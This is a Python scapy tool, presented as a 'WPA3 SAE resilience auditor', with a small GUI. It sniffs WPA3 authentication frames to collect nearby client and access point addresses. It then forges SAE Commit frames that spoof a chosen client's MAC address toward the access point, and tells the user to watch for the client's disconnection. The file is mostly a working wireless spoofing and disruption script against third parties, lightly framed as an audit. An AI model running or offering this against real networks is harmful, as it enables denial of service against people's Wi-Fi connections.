import os, sys, time, threading
from scapy.all import *
import tkinter as tk

class WPA3_Logic_Auditor:
    def __init__(self, iface):
        self.iface = iface
        self.targets = {} 
        self.prepare_hardware()
        
        self.root = tk.Tk()
        self.root.title("WPA3 SAE Resilience Auditor")
        self.root.geometry("700x500")
        self.root.configure(bg="#0a0a0a")

        self.listbox = tk.Listbox(self.root, bg="#111", fg="#00FF41", font=("Courier", 10), height=15)
        self.listbox.pack(padx=10, pady=10, fill="both", expand=True)

        btn_frame = tk.Frame(self.root, bg="#0a0a0a")
        btn_frame.pack(pady=10)
        
        tk.Button(btn_frame, text="AUDIT SAE STATE", command=self.test_sae_resilience, bg="#444", fg="white", width=20).pack(side="left", padx=5)
        
        self.status = tk.Label(self.root, text="Scanning for WPA3/SAE Targets...", bg="#0a0a0a", fg="#00FF41")
        self.status.pack()

        threading.Thread(target=self.scanner, daemon=True).start()

    def prepare_hardware(self):
        os.system(f"sudo ip link set {self.iface} down")
        os.system(f"sudo iw dev {self.iface} set type monitor")
        os.system(f"sudo ip link set {self.iface} up")

    def scanner(self):
        def handler(pkt):
            # Logic: Look for Authentication frames using SAE (Algorithm 3)
            if pkt.haslayer(Dot11Auth) and pkt.algo == 3:
                bssid = pkt.addr3
                client = pkt.addr2
                if client not in self.targets:
                    self.targets[client] = bssid
                    self.root.after(0, self.refresh_ui)
        sniff(iface=self.iface, prn=handler, store=0)

    def test_sae_resilience(self):
        # Logic: Send a single SAE Commit probe to test AP state management
        for i in self.listbox.curselection():
            client_mac = list(self.targets.keys())[i]
            bssid = self.targets[client_mac]
            
            # Constructing a basic SAE Commit Frame (Auth Algo 3, Seq 1)
            # This mimics a client starting a new session
            dot11 = Dot11(type=0, subtype=11, addr1=bssid, addr2=client_mac, addr3=bssid)
            sae_commit = Dot11Auth(algo=3, seqnum=1, status=0)
            
            pkt = RadioTap()/dot11/sae_commit
            
            print(f"[*] Sending SAE Resilience Probe to {bssid} for client {client_mac}")
            sendp(pkt, iface=self.iface, count=1, verbose=False)
            self.status.config(text=f"Probe Sent to {client_mac}. Observe for disconnect.")

    def refresh_ui(self):
        self.listbox.delete(0, tk.END)
        for client, bssid in self.targets.items():
            self.listbox.insert(tk.END, f"WPA3 Client: {client} | AP: {bssid}")

if __name__ == "__main__":
    if len(sys.argv) < 2: print("Usage: sudo python3 auditor.py [interface]")
    else: WPA3_Logic_Auditor(sys.argv[1]).root.mainloop()
